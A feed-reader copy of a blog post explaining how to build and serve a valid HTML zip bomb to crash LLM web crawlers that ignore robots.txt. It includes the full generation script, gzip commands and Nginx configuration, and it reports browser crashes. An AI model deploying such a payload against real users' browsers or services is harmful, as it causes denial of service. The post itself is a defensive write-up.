<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://ache.one/notes/html_zip_bomb">Original</a>
    <h1>A valid HTML zip bomb</h1>
    
    <div id="readability-page-1" class="page"><div><article id="_article"><p>2025-07-23T15:02:00.000</p><p><img src="https://ache.one/notes/res/zip_bomb_file.svg" alt="Illustration d&#39;une bombe zip"/></p><p>Many sites have been affected by the aggressiveness of web crawlers designed to improve LLMs.</p><h2 id="llm-web-crawlers"><a tabindex="0" href="#llm-web-crawlers">LLM Web Crawlers</a></h2><p>The initial problem is the aggressiveness of LLM web crawlers that don&#39;t respect <code>robots.txt</code>. The first idea that comes to mind is IP blocking. However, web crawlers have circumvented this restriction by using individual IPs via specialized botnets.</p><p>Another solution is therefore to exhaust the resources of the harvesters. With a zip bomb, we attempt to exhaust their RAM.<sup><a href="#user-content-fn-pro" id="user-content-fnref-pro" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup></p><p>We’re exploiting the asymmetry of the resources needed to serve the zip bomb versus those needed to detect it. Naturally, I’m going to try to minimize the resources needed to distribute the zip bomb.</p><h2 id="a-gzip-bomb"><a tabindex="0" href="#a-gzip-bomb">A Gzip bomb</a></h2><p>The most basic gzip bomb consists of zeros.</p><pre><code><span>$ </span><span><span>dd</span> <span>if</span>=/dev/zero bs=1M count=10240 | gzip -9 &gt; 10G.gzip</span>
</code></pre><p>That&#39;s not bad; the theoretical ratio is 1032:1 (approximately 1030 in practice for a zip bomb), so our file weighs ~10MiB.</p><p>The problem is that web browsers parse the page on the fly as soon as possible and quickly detect that it&#39;s not a valid HTML page.</p><p>So, I set myself the challenge of creating a valid HTML page containing a zip bomb.</p><h2 id="the-html-zip-bomb"><a tabindex="0" href="#the-html-zip-bomb">The HTML Zip Bomb</a></h2><p>I had several ideas. First, since it&#39;s an HTML page, we start with the HTML5 doctype. Then we try to fit the 10 MB of identical characters.</p><p>I first attempted to use <a href="https://shkspr.mobi/blog/2025/05/decorative-text-within-html/">HTML classes, which can contain anything</a>, but quickly the HTML comment solution seemed most practical. So, I set up a small shell script (in <a href="https://fishshell.com/">fish</a>) to create an HTML file with a 10 MB &#39;H&#39; comment.</p><pre><code><span>#!/bin/fish</span>


<span>echo</span> -n <span>&#39;&lt;!DOCTYPE html&gt;&lt;html lang=en&gt;&lt;head&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;Projet: Valid HTML bomb&lt;/title&gt;&lt;meta name=fediverse:creator content=@ache@mastodon.xyz&gt;&lt;link rel=canonical href=https://ache.one/bomb.html&gt;&lt;!--&#39;</span>


<span>echo</span> -n (string repeat --count 258 <span>&#39;H&#39;</span>) &gt;/tmp/H_258


<span>for</span> i <span>in</span> (<span>seq</span> 507)
    
    <span>cat</span> (<span>yes</span> /tmp/H_258 | <span>head</span> --lines=81925)
end

<span>cat</span> (<span>yes</span> /tmp/H_258 | <span>head</span> --lines=81924)


<span>echo</span> -n <span>&#34;--&gt;&lt;body&gt;&lt;p&gt;This is a HTML valid bomb, cf. https://ache.one/articles/html_zip_bomb&lt;/p&gt;&lt;/body&gt;&#34;</span>
</code></pre><p>Then, we gzip all that:</p><pre><code><span>$ </span><span>fish zip_bomb.fish | gzip -9 &gt; bomb.html.gz</span>
<span>$ </span><span><span>du</span> -sb bomb.html.gz</span>
10180	bomb.html.gz
</code></pre><p>We have our 1:1030 ratio, that’s perfect.</p><h2 id="serving-the-zip-bomb"><a tabindex="0" href="#serving-the-zip-bomb">Serving the Zip Bomb</a></h2><p>I use Nginx; the idea is to serve the pre-compressed file. Ideally, we don&#39;t even want the 10 GB file on the server.</p><p>To do that, we use the <code>ngx_http_gzip_static_module</code> <sup><a href="#user-content-fn-gzip_static_nginx" id="user-content-fnref-gzip_static_nginx" data-footnote-ref="" aria-describedby="footnote-label">2</a></sup>.</p><pre><code><span>location</span> = /bomb.html {
  <span>gzip</span> <span>on</span>; 
  <span>gzip_static</span> <span>on</span>;
  <span>gzip_proxied</span> expired <span>no</span>-cache <span>no</span>-store private auth;
  <span>gunzip</span> <span>off</span>; 

  <span>brotli_static</span> <span>on</span>;  
}
</code></pre><p>Unfortunately, Nginx returns a 404 if the <code>bomb.html</code> file doesn&#39;t exist, so I created a small, simple file that announces that it’s a gzip bomb.</p><pre><code><span>$ </span><span>curl https://ache.one/bomb.html</span>
You don&#39;t support gzip encoding. Add the HTTP header &#34;accept-encoding: gzip&#34;.
</code></pre><p>I verify that Nginx is serving the file correctly:</p><pre><code><span>$ </span><span>curl -H <span>&#34;accept-encoding: gzip,br&#34;</span> -I -- https://ache.one/bomb.html | grep content</span>
content-type: text/html; charset=utf-8
content-length: 8298
content-encoding: br
<span>$ </span><span>curl -H <span>&#34;accept-encoding: gzip&#34;</span> -I -- https://ache.one/bomb.html | grep content</span>
content-type: text/html; charset=utf-8
content-length: 10420650
content-encoding: gzip
</code></pre><p>Okay, the size is right. Now we absolutely must make sure that we don’t exceed the budget of a legitimate web crawler by forbidding it in robots.txt. By placing it at the root, I know that my robots.txt already forbids it, but otherwise, we should find this:</p><pre><code>User-agent: *
Disallow: /bomb.html
</code></pre><h2 id="results"><a tabindex="0" href="#results">Results</a></h2><p>Firefox struggles a lot and ends up crashing cleanly with an <code>NS_ERROR_OUT_OF_MEMORY</code> error, visible only in the developer tools. If I put the body tag before the malicious comment, I would certainly have a correctly displayed page.</p><p>Chrome is much faster to crash! It offers a happy screen signaling that an error occurred via <code>SIGKILL</code>.</p><p>In both cases, we notice that the page is partially loaded; however, the title is correct. Therefore, we are certain that a Selenium-type web crawler will crash on this HTML file. Fortunately, there appears to be no security vulnerability to exploit.</p><h2 id="evolution"><a tabindex="0" href="#evolution">Evolution</a></h2><p>The HTML comment trick is certainly not the most elegant. I’m sure there are plenty of ideas to fit packs of 258 identical characters<sup><a href="#user-content-fn-max_paquet" id="user-content-fnref-max_paquet" data-footnote-ref="" aria-describedby="footnote-label">3</a></sup>. However, here it seems to work so well that I haven’t taken the time to explore further. The interest of having a more varied HTML zip bomb would be to ensure that the HTML parser doesn’s optimize the reading of certain parts.</p><p>By the way, I allowed myself to create a brotli version as well. Since my site is available in brotli and the zip bomb is even more efficient in brotli, there’s no reason not to do it.</p></article></div></div>
  </body>
</html>
